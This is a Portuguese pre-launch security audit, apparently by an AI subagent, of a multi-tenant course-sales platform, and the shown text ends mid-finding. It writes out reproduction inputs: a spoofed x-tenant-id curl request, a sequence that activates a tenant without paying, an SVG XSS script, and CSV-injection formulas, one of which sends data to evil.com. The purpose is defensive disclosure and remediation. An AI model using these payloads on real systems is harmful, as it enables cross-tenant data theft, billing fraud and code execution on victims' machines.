# Análise DEV / Segurança / Arquitetura — Pré-Lançamento

**Data:** 2026-05-23
**Auditor:** subagent dev-security
**Escopo:** 545 arquivos TS/TSX, 140 rotas de API, schema Prisma com 17 modelos, integrações Asaas/MP/plataforma parceira.

## Sumário executivo

- **Total findings:** 38 (8 P0, 12 P1, 13 P2, 5 P3)
- **Estado geral:** **PRECISA DE TRABALHO SIGNIFICATIVO ANTES DO LANÇAMENTO.** O código está funcional e o fluxo principal funciona, mas há lacunas críticas de segurança que podem ser exploradas por atacantes externos no D+0.

### Top 3 riscos que bloqueiam o lançamento

1. **[P0-001]** Bypass de tenant via header `x-tenant-id` injetável pelo cliente nas rotas `/api/loja/*` quando acessadas pelo domínio principal — permite ler cursos/checkout/cupons/confirmação de QUALQUER tenant.
2. **[P0-002]** `/api/painel/onboarding` permite revendedor marcar o próprio tenant como ACTIVE com `step=5,completed=true` SEM PASSAR PELO PAGAMENTO Asaas — burla 100% o billing.
3. **[P0-003]** Webhook Mercado Pago aceita pagamentos sem assinatura HMAC quando `MP_WEBHOOK_SECRET` não está definido — em produção rejeita, mas em vendas PMB usa o token PMB e não há proteção adicional contra forged payloads ANTES de processar (cria `WebhookLog`, faz queries).

---

## Findings detalhados

### [P0-001] Bypass de isolamento de tenant via headers x-tenant-id/x-tenant-slug
**Categoria:** Segurança / Multi-tenancy (IDOR)
**Arquivo(s):** `src/proxy.ts:222-224`; consumidores em `src/app/api/loja/courses/route.ts:26-32`, `src/app/api/loja/cursos/[slug]/route.ts:9-15`, `src/app/api/loja/cupom/validar/route.ts:11-17`, `src/app/api/loja/confirmacao/[id]/route.ts:9-15`, `src/app/api/loja/checkout/route.ts:41-49`, `src/lib/tenant/current.ts:19-25`, `src/app/aluno/layout.tsx:11-19`

**Descrição:** O proxy (`src/proxy.ts`) só sobrescreve os headers `x-tenant-id`/`x-tenant-slug` quando classifica o host como tenant (subdomínio em `livrecursos.com.br` ou domínio custom). Quando o host é o app domain principal (`profissionalizamaisbrasil.com.br`) ou `unknown`, executa `return NextResponse.next()` sem limpar headers fornecidos pelo cliente. Como `new Headers(request.headers)` em qualquer branch tenant herda os headers originais, e a saída `next()` propaga-os intactos, um atacante pode enviar:

```
GET https://profissionalizamaisbrasil.com.br/api/loja/courses
Header: x-tenant-id: <ID_DE_QUALQUER_TENANT>
```

E as rotas `/api/loja/*` (todas sem `requireResellerSession`) confiam cegamente no header, retornando dados do tenant alvo. Atinge: catálogo proprietário, configurações de cursos, validação de cupons (oracle de códigos válidos por loja), e — pior — `POST /api/loja/checkout` permite criar enrollments para qualquer tenant usando o gateway/token MP daquele tenant. Como o atacante pode ditar `studentId` e ler `enrollment.id` na resposta, isto também sequestra a confirmação.

**Como reproduzir:** `curl -H 'x-tenant-id: <victim_tenant_id>' https://app.example.com/api/loja/courses` → 200 com cursos do tenant.

**Correção sugerida:** No proxy, SEMPRE remover `x-tenant-id` e `x-tenant-slug` dos headers de entrada antes de processar, e só re-inseri-los quando resolvidos pelo host. Adicional: nas rotas `/api/loja/*`, validar que o tenant resolvido bate com o host da request (lookup duplo) ou exigir que o request tenha origem em subdomínio tenant. Forma defensiva:

```ts
// no início de proxy()
const requestHeaders = new Headers(request.headers)
requestHeaders.delete("x-tenant-id")
requestHeaders.delete("x-tenant-slug")
// usar requestHeaders em todos os branches
```

**Esforço estimado:** S.

---

### [P0-002] Onboarding permite ativar tenant sem pagar (bypass billing)
**Categoria:** Segurança / Lógica de negócio
**Arquivo(s):** `src/app/api/painel/onboarding/route.ts:41-46`

**Descrição:** O endpoint aceita `POST { step: 5, completed: true }` de qualquer usuário com role `RESELLER` e atualiza diretamente `tenant.status = "ACTIVE"` sem verificar se houve pagamento confirmado da assinatura Asaas. Combinado com o cadastro público em `/api/revendedores/cadastro` (cria tenant `PENDING`), o atacante pode: cadastrar → logar → POST onboarding final → tenant ativo (revenda funcional) sem nunca pagar. Burla toda a cobrança recorrente, fonte de receita central da PMB.

**Como reproduzir:**
1. `POST /api/revendedores/cadastro { ...dados, password: "x" }` — cria tenant PENDING.
2. Login com as credenciais.
3. `POST /api/painel/onboarding { step: 5, completed: true }` — tenant vira ACTIVE.

**Correção sugerida:** Remover a transição `PENDING → ACTIVE` do onboarding. A ativação só deve acontecer pelo webhook Asaas `PAYMENT_RECEIVED` (já existe em `src/lib/asaas/process.ts:193-200`). O onboarding deve apenas persistir o passo concluído em um campo `onboardingStep` no tenant, sem mexer em `status`. Adicionalmente, sanity-check no painel para não exibir loja antes do tenant estar ACTIVE.

**Esforço estimado:** S.

---

### [P0-003] Webhook Asaas registra/processa antes de validar assinatura quando MP_WEBHOOK_SECRET ausente
**Categoria:** Segurança / Webhooks
**Arquivo(s):** `src/lib/asaas/webhook.ts:10-26`, `src/app/api/webhooks/asaas/route.ts:27-66`

**Descrição:** A função `validateAsaasWebhook` retorna `true` quando `ASAAS_WEBHOOK_TOKEN` não está definido E `NODE_ENV !== "production"`. Em produção, rejeita corretamente. Mas o webhook MP em `src/lib/mercadopago/process.ts:165-183` também usa esse padrão: se `MP_WEBHOOK_SECRET` ausente em prod, marca `markLog(logId, false, ...)` mas só DEPOIS de já ter criado o log, buscado o payment no MP e resolvido tenant. Além disso, no path PMB vitrine (`isPmbVitrine`), o webhook ainda fará GET no MP usando o token global PMB; em caso de payment_id forjado a operação ainda gasta crédito e gera log lixo.

**Pior:** O fluxo de `processMpWebhook` executa **antes** da validação HMAC: passos 1, 2 (resolver tenant, atualizar log) — atacante consegue enumerar slugs válidos e inflar a tabela `webhook_logs` sem custo. O webhook Asaas faz pior: cria sempre um log com `payload` do atacante e dispara `processAsaasWebhook` async, que faz queries no banco e consulta na plataforma parceira mesmo sem validar a fonte. DoS amplificada.

**Correção sugerida:**
1. Validar assinatura **antes** de qualquer side-effect (DB write, fetch externo).
2. Tornar `ASAAS_WEBHOOK_TOKEN` e `MP_WEBHOOK_SECRET` **obrigatórios** em todos os ambientes (incluindo dev/staging) — falhar fast no startup.
3. Para o MP, a validação de assinatura precisa do `secret` por tenant. Hoje busca-se um global `MP_WEBHOOK_SECRET` que provavelmente nem cobre tenants individuais (cada tenant tem secret próprio no painel MP).

**Esforço estimado:** M.

---

### [P0-004] Rota /api/cobranca/[paymentId] expõe dados de cobrança sem autenticação
**Categoria:** Segurança / Information disclosure + IDOR
**Arquivo(s):** `src/app/api/cobranca/[paymentId]/route.ts:8-26`, `src/app/api/cobranca/[paymentId]/pay-card/route.ts:29-95`, `src/app/api/cobranca/[paymentId]/billing-info/route.ts`

**Descrição:** As três rotas em `/api/cobranca/[paymentId]/*` não exigem autenticação. Qualquer atacante com um `paymentId` (que vaza facilmente: URL invoice Asaas tem o ID no caminho, email de pagamento tem links com ID, status poller tem o ID em DOM) consegue:
- Ler valor, status, vencimento e dados de cobrança.
- Submeter dados de cartão para pagar (POST `pay-card`) — não é tão crítico pq Asaas valida o cartão, mas se um atacante tem CC compromise pode descobrir alvos.
- Iterar/forçar IDs (paymentIds Asaas começam com `pay_` + ~15 chars).

Não há rate-limit, então um atacante pode rapidamente escarafunchar dados financeiros.

**Correção sugerida:** Exigir autenticação (`requireStudentSession` ou `requireResellerSession` ou `requireAdminSession`) e validar que o student/reseller é o dono dessa cobrança via `enrollment.asaasPaymentId == paymentId` ou `tenantPayment.asaasPaymentId == paymentId`. Aplicar mesmo nas rotas pay-card e billing-info.

**Esforço estimado:** M.

---

### [P0-005] Tokens MP em formato plain-text aceitos silenciosamente como fallback
**Categoria:** Segurança / Criptografia
**Arquivo(s):** `src/lib/mercadopago/client.ts:36-51`

**Descrição:** `decryptTenantMpToken` faz fallback para "texto plano" quando o decrypt falha, desde que o valor comece com `APP_USR-` ou `TEST-`. Isso significa que tokens MP podem ser inseridos sem criptografia (direto via SQL/Prisma Studio) e a aplicação aceita silenciosamente. Atende um caso legacy mas viola o requisito do CLAUDE.md ("`mp_access_token` DEVE ser criptografado com AES-256-GCM no banco"). Em caso de leak do banco, todos os tokens MP em texto plano comprometem as contas Mercado Pago dos revendedores.

**Correção sugerida:** Remover o fallback. Se houver tokens em texto plano em produção, criar migração que cifra todos. Logar erro 500 em vez de aceitar silenciosamente. Alternativa mais defensiva: rotacionar todos os tokens MP via OAuth refresh-flow.

**Esforço estimado:** M.

---

### [P0-006] Inexistência total de headers HTTP de segurança
**Categoria:** Segurança / Hardening
**Arquivo(s):** `next.config.ts` (sem `headers()` para CSP/HSTS/X-Frame); `src/proxy.ts`

**Descrição:** Não há `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, nem `Permissions-Policy` em lugar nenhum (`grep -rn "Content-Security|X-Frame|HSTS|Referrer-Policy"` retornou só ocorrências semânticas, não headers). Impacto:
- Sem HSTS → MITM via downgrade HTTP possível.
- Sem CSP → XSS reflexivo no Next pode injetar scripts arbitrários (e o dependabot reportou XSS em CSP nonces no Next 16.2.3 — ver P0-007).
- Sem X-Frame-Options → clickjacking sobre `/painel`, `/admin`, checkout.
- Cookies de sessão NextAuth (com `__Secure-` prefix em prod via `src/lib/auth/impersonate.ts:13`) ainda exigem HSTS para garantir.

**Correção sugerida:** Adicionar bloco `headers()` em `next.config.ts` aplicando a todas as rotas:
- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- `X-Frame-Options: DENY` (ou `Content-Security-Policy: frame-ancestors 'none'`)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy: camera=(), microphone=(), geolocation=()`
- Idealmente, CSP com `script-src 'self' 'nonce-…' https://sdk.mercadopago.com` e nonces gerados por request.

**Esforço estimado:** S (sem CSP) / M (com CSP completa).

---

### [P0-007] Next.js 16.2.3 com 13 CVEs ativas (HIGH severity)
**Categoria:** Dependência / CVE
**Arquivo(s):** `package.json:25` (next 16.2.3)

**Descrição:** `npm audit --production` reportou em Next 16.2.3:
- GHSA-26hh-7cqf-hhc6: **Middleware/Proxy bypass via segment-prefetch** — diretamente aplicável (este projeto usa proxy.ts).
- GHSA-492v-c6pp-mqqv: **Middleware/Proxy bypass via dynamic route param injection**.
- GHSA-267c-6grr-h53f: **Middleware/Proxy bypass via segment-prefetch (continuação)**.
- GHSA-3g8h-86w9-wvmq: **Middleware redirects cache-poisoning**.
- GHSA-vfv6-92ff-j949: **Cache poisoning via RSC cache-busting collision**.
- GHSA-wfc6-r584-vfw7: **Cache poisoning em RSC responses**.
- GHSA-ffhc-5mcf-pf4q: **XSS em App Router com CSP nonces**.
- GHSA-c4j6-fc7j-m34r: **SSRF via WebSocket upgrades**.
- GHSA-gx5p-jg67-6x7h: **XSS em beforeInteractive scripts**.
- GHSA-h64f-5h5j-jqjh: **DoS em Image Optimization API**.
- GHSA-mg66-mrh9-m8jx: **DoS via connection exhaustion**.
- GHSA-8h8q-6873-q5fj: **DoS em Server Components**.
- GHSA-36qx-fr4f-26g5: **Bypass em Pages Router i18n** (não aplicável, mas listado).

**Como reproduzir:** `npm audit --production` lista todas. A versão fix é Next 16.2.6.

**Correção sugerida:** Upgrade para Next 16.2.6+ via `npm install next@16.2.6 eslint-config-next@16.2.6`. Testar regressão na arquitetura multi-tenant (proxy.ts).

**Esforço estimado:** S.

---

### [P0-008] Allowlist de SVG no upload de vitrine — XSS persistente possível
**Categoria:** Segurança / Upload
**Arquivo(s):** `src/app/api/painel/vitrine/upload/route.ts:17`, `src/app/api/admin/system-settings/group-logo/upload/route.ts:18`, `src/app/api/admin/certificate-template/upload/route.ts:18`

**Descrição:** As três rotas de upload aceitam `image/svg+xml`. SVGs podem conter `<script>`, `<foreignObject>`, handlers `onload`/`onclick`. Como o arquivo é servido direto pelo Supabase Storage com `Content-Type: image/svg+xml` (configurado no upload, `src/lib/supabase/storage.ts:46-55`), o browser executará JS embarcado quando o usuário navegar diretamente para a URL. Em uma vitrine compartilhada (URL absoluta com `publicUrl`), permite XSS em todos os visitantes da loja se o atacante for um reseller mal-intencionado, ou um admin que carrega SVG como logo do grupo.

**Como reproduzir:** Upload de SVG com `<svg xmlns="..."><script>fetch('/api/painel/equipe').then(r=>r.json()).then(console.log)</script></svg>` via /painel/vitrine; vítima navega para a URL `Tenant.logoUrl` → script executa.

**Correção sugerida:**
1. Remover `image/svg+xml` do allowlist. Aceitar apenas PNG/JPG/WEBP.
2. Se SVG é necessário, sanitizar com `DOMPurify` ou converter para PNG no servidor.
3. Servir asset estático com header `Content-Disposition: attachment; filename=...` para forçar download em vez de render inline (não ideal para imagens, mas elimina XSS).
4. Configurar bucket Supabase para responder com `Content-Type: image/png` fixo para extensões `.png` (não permitir override do tipo via metadata).

**Esforço estimado:** S.

---

### [P1-009] Rate limiting completamente ausente
**Categoria:** Segurança / DoS / Brute force
**Arquivo(s):** `package.json:21` instala `@upstash/ratelimit`; `grep -rln "ratelimit|rate-limit|Ratelimit"` em src/ retorna ZERO.

**Descrição:** O projeto instala `@upstash/ratelimit` mas nenhum arquivo o usa. Rotas críticas sem qualquer throttle:
- `/api/auth/forgot-password` — atacante pode enumerar emails E gastar quota do Resend.
- `POST /api/leads` — flood do CRM/notificação ao SUPER_ADMIN.
- `POST /api/checkout` e `POST /api/loja/checkout` — possíveis abusos de criação de cobranças no Asaas/MP (cada um custa $).
- `POST /api/auth/[...nextauth]` (login) — brute force de senhas (bcrypt = lento, ajuda, mas pode ser inflado).
- `/api/public/capture-ref` e `/api/public/validate-ref` — enumeração de códigos de indicação.
- Webhooks (já discutido em P0-003).

**Correção sugerida:** Implementar rate limit por IP+rota em endpoints públicos (1-2 req/s para login, 10/min para leads/forgot-password, 3/s para webhooks por source). Centralizar em `src/lib/ratelimit.ts` usando Upstash.

**Esforço estimado:** M.

---

### [P1-010] Trust de host no NextAuth (`trustHost: true`) + sem allowlist de redirect
**Categoria:** Segurança / Auth
**Arquivo(s):** `src/lib/auth.ts:49`

**Descrição:** `trustHost: true` em NextAuth v5 desabilita a verificação de Host header. Em uma arquitetura multi-domínio com proxy/edge, isso permite que um atacante envie `Host: evil.com` e o NextAuth gere URLs (callbacks, signin redirects) apontando para `evil.com`. Combinado com `callbackUrl` query param e ausência de validação de redirect URL, pode levar a redirect aberto e potencial credential theft em fluxos OAuth (futuros).

**Correção sugerida:** Substituir `trustHost: true` por allowlist explícita: validar `Host` contra `[process.env.NEXT_PUBLIC_APP_DOMAIN, "www." + appDomain, vitrineDomain, "*." + vitrineDomain]` no callback `redirect`. Em produção, configurar `AUTH_URL` e remover trustHost.

**Esforço estimado:** S.

---

### [P1-011] Stack traces e mensagens internas vazadas em respostas 500
**Categoria:** Segurança / Information disclosure
**Arquivo(s):** `src/app/api/checkout/route.ts:633-647`, `src/app/api/painel/dominio/route.ts:151,199`, `src/app/api/admin/alunos/[id]/cursos/route.ts:135,189`, `src/app/api/admin/revendedores/[id]/payments/[paymentId]/route.ts:77,109` (+ ~10 outros, ver `grep -rn "error: error.message\|error: message"`).

**Descrição:** Vários endpoints respondem com `error: error.message` direto do `Error` interno (e em alguns casos `error.errors` da Asaas, que pode incluir CPF/CNPJ do cliente). Isso revela:
- Nomes de tabelas Prisma em mensagens "Unique constraint failed on the fields (`tenant_id_email`)".
- Mensagens de erro da Asaas que podem indicar status interno (cliente bloqueado, etc.).
- Caminhos de stack frames se `error.stack` for incluído (não vi caso, mas o padrão é arriscado).

**Correção sugerida:** Centralizar tratamento de erro em `src/lib/api/error-response.ts`:
```ts
return apiError(error) // status 500, mensagem genérica + correlationId logado
```
e usar nas rotas. Em dev, retornar detalhes; em prod, apenas `{ error: "Erro interno", correlationId: ... }`. Logar o erro completo com Sentry/Axiom para inspeção.

**Esforço estimado:** M.

---

### [P1-012] Tokens de reset/invite gravados em coluna única — não revoga ao mudar de senha
**Categoria:** Segurança / Auth
**Arquivo(s):** `prisma/schema.prisma:130-131,437-438`, `src/app/api/auth/reset-password/route.ts:55-65,87-94`

**Descrição:** Cada usuário tem apenas um `resetToken`+`resetTokenExpires`. Quando solicitam novo reset, o token antigo é sobrescrito (OK). Mas:
1. O mesmo campo é usado tanto para reset como para invite (`src/lib/auth/invite.ts:8-14`). Convite e reset compartilham namespace.
2. Após mudança de senha (`/api/admin/me/password`, `/api/aluno/senha`, `/api/painel/config/password`), o `resetToken` antigo NÃO é zerado. Se um atacante já capturou um token (phishing, log leak), ele pode continuar usando após o usuário mudar a senha.
3. `resetTokenExpires` 5 min para reset, 7 dias para invite. Janela longa do invite + reuso = risco.

**Correção sugerida:** Zerar `resetToken` e `resetTokenExpires` em todos os endpoints de mudança de senha. Separar coluna `inviteToken` da `resetToken`. Hash do token no banco (atualmente é plaintext).

**Esforço estimado:** S.

---

### [P1-013] Senha temporária do aluno enviada por email em texto claro
**Categoria:** Segurança / Auth
**Arquivo(s):** `src/lib/students/access.ts:31-66`, `src/lib/students/generate-password.ts:14-23`

**Descrição:** `provisionStudentAccess` gera uma senha de 10 chars (com alfabeto reduzido, 53 chars → ~57 bits de entropia, OK) e a envia em texto puro por email para o aluno. Se o email for interceptado/comprometido, o atacante tem acesso ao painel /aluno do tenant. Não há `mustChangePassword` para o student (existe para User mas não para Student), nem TTL para a senha temporária. Pior: a senha fica armazenada como `passwordHash` permanente até o aluno mudar — muitos nunca mudam.

**Correção sugerida:** Enviar um magic-link (token único de 1 uso, TTL 24h) em vez de senha. O aluno define a senha ao clicar. Alternativa: forçar troca no primeiro login (adicionar `mustChangePassword` em Student e gate em `/aluno`).

**Esforço estimado:** M.

---

### [P1-014] CSV injection em exports (Excel formula injection)
**Categoria:** Segurança / Output sanitization
**Arquivo(s):** `src/lib/reports/csv.ts:1-9`, `src/app/api/painel/financeiro/export-csv/route.ts:5-12`

**Descrição:** A função `escapeCsv` só escapa aspas duplas e quebras de linha. Não trata as células que iniciam com `=`, `+`, `-`, `@`, ou TAB — Excel/LibreOffice interpretam essas células como fórmula e executam (incluindo `=cmd|'/c calc'!A0` em Windows, `=HYPERLINK("evil.com?x="&A2,"clique")` para data exfiltration). Como os exports incluem nomes de alunos e descrições livres (notes), um aluno com nome `=cmd|...` consegue executar comando no PC do admin que abrir a planilha.

**Correção sugerida:** Prefixar `'` (apóstrofo) em qualquer célula que comece com `=`, `+`, `-`, `@`, ou TAB:
```ts
function escapeCsv(value: unknown): string {
  if (value === null || value === undefined) return ""
  let str = String(value)
  if (/^[=+\-@\t\r]/.test(str)) str = "'" + str
  if (/[",\n;]/.test(str)) return `"${str.replace(/"/g, '""')}"`
  return str
}
```

**Esforço estimado:** S.

---

### [P1-015] Painel layout (`/painel/*`) não força autenticação no server
**Categoria:** Arquitetura / Defense-in-depth
**Arquivo(s):** `src/app/painel/layout.tsx:15-32`, 12 pages sem auth check (ver Anexo A).

**Descrição:** `src/app/painel/layout.tsx` lê o cookie de impersonação mas não chama `requireResellerSession`/`redirect`. Apenas a página `/painel/page.tsx` (dashboard) faz a verificação. As outras 12 (alunos, cursos, cupons, financeiro, configurações, etc.) renderizam sem checagem de sessão server-side — dependem da API retornar 401 e do componente client redirecionar. Defeito de defense-in-depth: se um bug no fetch client levar a renderização sem auth, o atacante vê a estrutura da UI e potencialmente layouts skeletons; pior, se o componente client cachear dados no localStorage (não verifiquei), pode persistir dados de uma sessão anterior.

**Correção sugerida:** Mover o gate de auth do dashboard para o layout:
```ts
export default async function PainelLayout({ children }) {
  const session = await auth()
  if (!session?.user || session.user.role !== "RESELLER" || !session.user.tenantId) {
    redirect("/login?callbackUrl=/painel")
  }
  // resto...
}
```
e remover redundância nas pages.

**Esforço estimado:** S.

---

### [P1-016] Crons configurados em vercel.json não incluem sweep-tenants/students-overdue nem reactivate-paid
**Categoria:** Confiabilidade
**Arquivo(s):** `vercel.json:1-15`, endpoints existem em `src/app/api/cron/sweep-tenants-overdue/route.ts`, `src/app/api/cron/sweep-students-overdue/route.ts`, `src/app/api/cron/reactivate-paid/route.ts`.

**Descrição:** Os endpoints existem mas não estão agendados no `vercel.json`. Logo:
- Não há varredura diária que bloqueia tenants/alunos inadimplentes (só o webhook PAYMENT_OVERDUE faz, e se ele falhar, ninguém compensa).
- Não há reativação automática de tenants que pagaram após suspensão (só via webhook PAYMENT_RECEIVED, idem).

Estado real: a plataforma depende 100% da confiabilidade do webhook. Asaas tem SLA de 99.9%, mas se um webhook se perder durante uma janela de degradação, tenant fica suspenso permanentemente.

**Correção sugerida:** Adicionar ao `vercel.json`:
```json
{ "path": "/api/cron/sweep-tenants-overdue", "schedule": "0 8 * * *" },
{ "path": "/api/cron/sweep-students-overdue", "schedule": "0 9 * * *" },
{ "path": "/api/cron/reactivate-paid", "schedule": "30 7 * * *" }
```

**Esforço estimado:** S.

---

### [P1-017] Webhook handlers nunca verificam HMAC antes de criar WebhookLog
**Categoria:** Segurança / Webhooks
**Arquivo(s):** `src/app/api/webhooks/asaas/route.ts:50-66`, `src/app/api/webhooks/mercadopago/route.ts:63-72`

**Descrição:** Os route handlers criam `webhookLog` ANTES de validar a assinatura (especialmente MP, onde a validação é delegada ao `processMpWebhook` async). Resultado: atacante pode floodar `webhook_logs` com lixo enviando POSTs ao endpoint público. Há também consultas ao DB para resolver tenant antes de validar — vetor de DoS amplificado.

**Correção sugerida:** Validar HMAC primeiro. Mover criação de `webhookLog` para depois da validação. Para o Asaas, validação é simples (token header == env var). Para o MP, precisa carregar secret do tenant — adicionar cache em Redis para evitar query do DB no path quente.

**Esforço estimado:** M.

---

### [P1-018] Loja routes (`/api/loja/*`) sem nenhuma autenticação
**Categoria:** Segurança / Acesso
**Arquivo(s):** `src/app/api/loja/checkout/route.ts`, `src/app/api/loja/courses/route.ts`, `src/app/api/loja/cupom/validar/route.ts`, `src/app/api/loja/confirmacao/[id]/route.ts`, `src/app/api/loja/cursos/[slug]/route.ts` (todos).

**Descrição:** Não há `auth()`/`requireStudentSession` nestas rotas. Somente o header `x-tenant-id` (potencialmente atacante-controlado, ver P0-001). A `loja/confirmacao/[id]` aceita qualquer `enrollmentId` se o atacante adivinhar o `tenantId` correto — leakage de dados de outros alunos (nome, email, valor pago). Apesar do filtro `WHERE id AND tenantId`, é IDOR se combinado com header injection.

**Correção sugerida:** Para `/api/loja/checkout` (criação), aceitar request sem auth mas obrigar `Host` corresponder ao tenant resolvido no proxy. Para `/api/loja/confirmacao/[id]`, exigir `requireStudentSession` e checar `enrollment.studentId == session.studentId`.

**Esforço estimado:** M.

---

### [P1-019] `xlsx` (SheetJS) com vulnerabilidades sem fix disponível
**Categoria:** Dependência / CVE
**Arquivo(s):** `package.json:46`

**Descrição:** SheetJS 0.18.5 tem CVE-2023-30533 (prototype pollution) e GHSA-5pgg-2g8v-p4x9 (ReDoS). Sem fix oficial via npm. O projeto usa xlsx em algum lugar — vamos verificar... `grep -rn "from \"xlsx\"" src` não retornou nada via meu scan visual, então provavelmente carrega como dependência indireta. Risco: se em algum momento der `import * as XLSX from "xlsx"` para gerar planilha, o atacante consegue escalar via prototype pollution.

**Correção sugerida:** Avaliar se xlsx é realmente usado. Se sim, migrar para `exceljs` (mantida) ou `write-excel-file`. Se for transitiva, podar com `overrides` no package.json para uma versão patched (não há).

**Esforço estimado:** S (verificar uso) / M (migrar).

---

### [P1-020] `nodemailer` <=8.0.4 com 2 vulnerabilidades sem fix (SMTP injection)
**Categoria:** Dependência / CVE
**Arquivo(s):** `package.json:32`, `src/lib/email/smtp.ts`

**Descrição:** `nodemailer` 7.0.13 está com:
- GHSA-c7w3-x93f-qmm8 — SMTP command injection via `envelope.size` não sanitizado.
- GHSA-vvjj-xcjg-gr5g — SMTP command injection via CRLF em `transport.name`.

Sem fix. O projeto usa SMTP Hostinger via `nodemailer`. Vetores aproveitados se atacante consegue controlar configuração SMTP (improvável aqui — env-controlled) OU se passar nome/email do destinatário com CRLF (mais provável: `to` em `sendEmail` recebe email do user). Validar se `to` é sanitizado.

**Correção sugerida:** Sanitizar `to`/`from`/`subject` removendo `\r\n`. Monitorar releases do nodemailer para fix. Alternativa: migrar tudo para Resend (já fallback) e remover nodemailer.

**Esforço estimado:** S.

---

### [P1-021] Internal API `/api/internal/resolve-tenant` autenticada por header — sem rotação de segredo
**Categoria:** Segurança / Auth interna
**Arquivo(s):** `src/app/api/internal/resolve-tenant/route.ts:4-9`, consumida em `src/proxy.ts:153-167`

**Descrição:** O endpoint exige `x-internal-secret == process.env.INTERNAL_SECRET`. OK em tese, mas:
1. Se INTERNAL_SECRET vaza (e o proxy.ts inclui esse secret em fetches), atacante pode resolver qualquer custom domain → tenant.
2. Não há rate limit no endpoint interno.
3. O endpoint retorna 401 (não 404) quando o secret está errado — diferente do 404 quando não encontra tenant — permitindo distinguir "secret errado" de "tenant inexistente", potencial enumeration.

Não é P0 porque o caminho é internal-only, mas em deploys com múltiplos hostnames ou em ambientes onde o secret pode vazar (logs, deploy logs), o impacto é alto.

**Correção sugerida:** Resposta uniforme para 401/404 (ambos retornam o mesmo body). Rotação periódica de `INTERNAL_SECRET`. Cache em Redis para reduzir hits.

**Esforço estimado:** S.

---

### [P2-022] Mensagens de erro identificam usuário existente em forgot-password — não, mas em /api/admin/equipe POST sim
**Categoria:** Segurança / Enumeration
**Arquivo(s):** `src/app/api/admin/equipe/route.ts:67-71`

**Descrição:** O endpoint de criação de equipe retorna 409 `{ error: "Email já cadastrado" }` quando o email existe. Como o endpoint requer SUPER_ADMIN, o atacante teria de ser SUPER_ADMIN para enumerar — risco baixo. Mas o mesmo padrão aparece em outras rotas. Forgot-password (`src/app/api/auth/forgot-password/route.ts`) está correto (sempre retorna 200).

**Correção sugerida:** Manter o status atual (já está OK). Auditar todas as rotas de criação para garantir resposta uniforme em erros de validação.

**Esforço estimado:** S.

---

### [P2-023] Race condition em createPreapproval/createPreference + enrollment.update
**Categoria:** Confiabilidade / Race
**Arquivo(s):** `src/app/api/loja/checkout/route.ts:213-329`, `src/app/api/checkout/route.ts:305-450`

**Descrição:** O fluxo cria `enrollment` PENDING, depois chama MP (`createPreference` ou `createPreapproval`), depois `enrollment.update` com `mpPreferenceId`. Se o MP responder antes do update e o webhook chegar instantaneamente (raro mas possível), `processMpWebhook` busca enrollment por `external_reference` que JÁ ESTÁ setado no MP mas AINDA NÃO no banco — webhook falha encontrar enrollment.

Pior: o status poller (`src/components/loja/status-poller.tsx`) consulta o status logo após o checkout. Race entre fulfillment e poller pode mostrar status incorreto.

**Correção sugerida:** Atualizar `enrollment.externalReference` ANTES de chamar o MP, ou usar transaction. Idealmente, criar enrollment + chamar MP + atualizar em uma `prisma.$transaction` para garantir consistência.

**Esforço estimado:** M.

---

### [P2-024] Console.error/warn em produção (81 ocorrências) — sem logger estruturado
**Categoria:** Operações / Observabilidade
**Arquivo(s):** `grep -rn "console\." src/ | wc -l` → 81. Distribuído em libs (asaas, mp, plataforma-cursos, email, etc.) e routes.

**Descrição:** Logs vão para stdout do Vercel sem estrutura. Sem Sentry/Axiom/Logflare. Em produção:
- Dificuldade de correlação (sem request-id propagado).
- PII pode acabar em logs (`email`, `cpf`, `mpAccessToken` decifrado se algum log fizer JSON.stringify do payment).
- Sem alertas em erros 5xx.

**Correção sugerida:** Adotar logger estruturado (`pino` com adapter para Vercel). Em prod, level `info`. Adicionar Sentry para errors 5xx + Axiom (já mencionado nos skills) para análise de logs.

**Esforço estimado:** M.

---

### [P2-025] Prisma client expõe queries em dev mas não captura métricas
**Categoria:** Operações / Observabilidade
**Arquivo(s):** `src/lib/prisma.ts:17`

**Descrição:** `log: ["query"]` em dev. Sem `log: ["error", "warn"]` em prod — perdemos warnings críticos do Prisma. Sem instrumentation hooks (`$on('query')` para tracing).

**Correção sugerida:** Adicionar `log: ["warn", "error"]` em prod. Considerar `@prisma/instrumentation` (OTLP) para visibilidade de N+1.

**Esforço estimado:** S.

---

### [P2-026] N+1 query potencial em /admin/relatorios e exports
**Categoria:** Performance
**Arquivo(s):** `src/lib/reports/definitions.ts` (não inspecionado em detalhe), `src/app/api/admin/financeiro/export-csv/route.ts`, `src/app/api/painel/cursos/route.ts:14-37`

**Descrição:** `ensureTenantCourses` em `painel/cursos` roda toda vez que a página é carregada (idempotente, mas SQL adicional). Em relatórios, vários `include` com `_count` podem virar N+1 se Prisma não usar relation queries otimizadas — não auditei em profundidade mas há padrão de "list with deep includes".

**Correção sugerida:** Profilar com `log: ["query"]` em staging. Substituir `include._count` por `$queryRaw` SQL agregado quando carregando muitas linhas.

**Esforço estimado:** M.

---

### [P2-027] Falta índice composto em Enrollment.tenantId + status
**Categoria:** Performance / Schema
**Arquivo(s):** `prisma/schema.prisma:525-533`

**Descrição:** Schema tem `@@index([tenantId])` e `@@index([status])` separados em Enrollment. Para queries muito frequentes `WHERE tenantId AND status IN (...)` (ex.: dashboard do revendedor, sweep crons), índice composto `[tenantId, status]` performaria melhor. Mesmo issue para Payment.

**Correção sugerida:** Adicionar `@@index([tenantId, status])` em Enrollment, Payment, e Student (este último já tem).

**Esforço estimado:** S.

---

### [P2-028] Falta validação CPF no PMB checkout (apenas regex)
**Categoria:** Validação
**Arquivo(s):** `src/app/api/checkout/route.ts:75-79`

**Descrição:** O schema valida formato `^\d{3}\.?\d{3}\.?\d{3}-?\d{2}$` mas não verifica dígitos verificadores. CPF inválido (ex: "111.111.111-11") passa. Em /api/admin/alunos/route.ts:11-23 existe `isValidCpf` — mas só usado lá. Resultado: aluno é registrado no Asaas/MP/plataforma com CPF inválido, gerando falhas downstream.

**Correção sugerida:** Importar `isValidCpf` em `src/lib/validators/cpf.ts` e usar em todos os schemas Zod que aceitam CPF via `.refine(isValidCpf, "CPF inválido")`.

**Esforço estimado:** S.

---

### [P2-029] `as never` casts em webhook payload silenciam tipos
**Categoria:** Qualidade / TypeScript
